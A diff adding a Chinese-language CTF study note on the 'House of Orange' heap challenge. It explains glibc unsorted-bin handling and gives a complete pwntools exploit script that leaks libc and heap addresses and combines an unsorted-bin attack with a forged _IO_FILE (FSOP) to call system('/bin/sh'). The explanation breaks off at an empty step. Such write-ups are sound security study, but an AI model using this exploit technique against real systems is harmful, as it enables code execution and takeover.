@@ -396,10 +396,136 @@ if __name__ == '__main__':
 
  保护全开，卖欧润吉，有add有show有edit，但是没有free
 
+![](用户态堆/images/heap刷题/orange.jpg)
+
 edit只能进行3次，并且存在大范围越界写
 
-可以通过大范围越界写修改top chunk的size，
+可以通过大范围越界写修改top chunk的size，再申请比top chunk大的size将其释放到unsorted bin中，我们就在无free()函数的情况下获得了一个unsorted bin堆块。
 
+每次执行add()函数会malloc三个chunk，大小分别是0x20, size+0x10, 0x20，在打unsorted bin attack时，当我们将unsorted bin chunk的bk指针覆写为`&_IO_list_all-0x10`后执行add()，则会先malloc(0x20)，此时会先：
+
+1. 将chunk从unsorted bin中取出，这一步完成unsorted bin attack，将_IO_list_all覆写；
+```c
+unsorted_chunks(av)->bk = bck;  
+bck->fd = unsorted_chunks(av);
+```
+2. 判断该chunk为small bin chunk，先放入small bin中
+```c
+if (in_smallbin_range(size)) // 假如是small chunk。
+{
+    victim_index = smallbin_index(size); // 获取small chunk对应的bin的编号
+    bck = bin_at(av, victim_index);      // 将这个bin赋给bck
+    fwd = bck->fd;                       // 将这个bin的fd赋给fwd，也就是这个bin的第一个chunk
+    // 这里还没放回去，但是获取到了要放入的small bin的头指针和第一个chunk
+}
+```
+3. 
+```c
+```
+
+
+```python
+from pwn import *
+context(arch='amd64', os='linux',log_level='debug')
+
+local = 1
+binary_path = './pwn'
+gdb_script = ""
+gdb_script += "c\n"
+domain = "node5.buuoj.cn"
+port = 26589
+global io,gdb_io
+elf = ELF(binary_path)
+libc = elf.libc
+
+def connect(isLocal,isGDB,isIO):
+    if not isLocal:
+        io = remote(domain, port)
+        return io
+    elif isGDB:
+        if isIO:
+            io = process(binary_path)
+            (pid,gdb_io) = gdb.attach(io,gdb_script,api=True)
+            return io,gdb_io
+        else:
+            io = gdb.debug(binary_path,gdb_script)
+            return io
+    else:
+        io = process(binary_path)
+        return io
+
+def add(size, content):
+    io.sendafter(b'choice', b'1')
+    io.sendafter(b'Length of name :', str(size))
+    io.sendafter(b'Name', content)
+    io.sendafter(b'Price of Orange:', str(1))
+    io.sendafter(b'Color of Orange:', str(0xddaa))
+    io.recvuntil(b"Finish")
+
+def show():
+    io.sendafter(b'choice', b'2')
+    
+def edit(size, content):
+    io.sendafter(b'choice', b'3')
+    io.sendafter(b'Length of name :', str(size))
+    io.sendafter(b'Name', content)
+    io.sendafter(b'Price of Orange:', str(1))
+    io.sendafter(b'Color of Orange:', str(0xddaa))
+    io.recvuntil(b"Finish")
+
+def attack(io):
+    add(0x400, b'\x11'*0x400)
+    payload = flat(
+        b'\x22'*0x400,
+        p64(0),p64(0x21),
+        p64(0xddaa00000001),p64(0),
+        p64(0),p64(0xbb1)
+        )
+    edit(len(payload), payload)
+    add(0x1024, b'\x00'*0x1000)
+    add(0x400, b'\x11'*1)
+    show()
+    io.recvuntil(b"Name of house : ")
+    malloc_addr = u64(io.recv(6).ljust(8, b'\x00')) - (0x4111-0x3b78) - 0x68
+    libc_base = malloc_addr - libc.symbols['__malloc_hook']
+    log.success(f"malloc_addr: {hex(malloc_addr)}")
+    log.success(f"libc_base: {hex(libc_base)}")
+    IO_list = libc_base + libc.symbols['_IO_list_all']
+    log.success(f"IO_list: {hex(IO_list)}")
+    edit(0x10, b'\x22'*0x10)
+    show()
+    io.recvuntil(b"Name of house : ")
+    io.recv(0x10)
+    heap_addr = u64(io.recv(6).ljust(8, b'\x00')) - 0x4b0
+    log.success(f"heap_addr: {hex(heap_addr)}")
+    payload = flat(
+        b'\x11' * 0x400,
+        p64(0), p64(0x21),
+        p64(0xddaa00000001), p64(0),
+    )
+    fake_file = flat(
+        b"/bin/sh\x00",p64(0x61), #fp, size
+        p64(0), p64(IO_list-0x10), #fd, bk
+        p64(2), p64(3), #write_base, write_ptr
+    )
+    fake_file = fake_file.ljust(0xc0, b"\x00")
+    fake_file += p64(0) #_mode
+    fake_file += flat(
+        p64(0),p64(0),#_mode到vtable间0x10
+        p64(heap_addr+0x9c0),#vtable
+        p64(0)*3,p64(libc_base + libc.symbols['system']), #_IO_overflow_t
+    )
+    payload += fake_file
+    #unsortedbin attack + FSOP
+    edit(len(payload), payload)
+    pause()
+    add(0x10, b'\x78'*1) #此处会crash因为unsortedbin被破坏，进入利用链
+    io.interactive()
+    
+if __name__ == '__main__':
+    io = connect(True, False, False)
+    attack(io)
+```
 
 ## VNCTF 2021 pwn复现
 
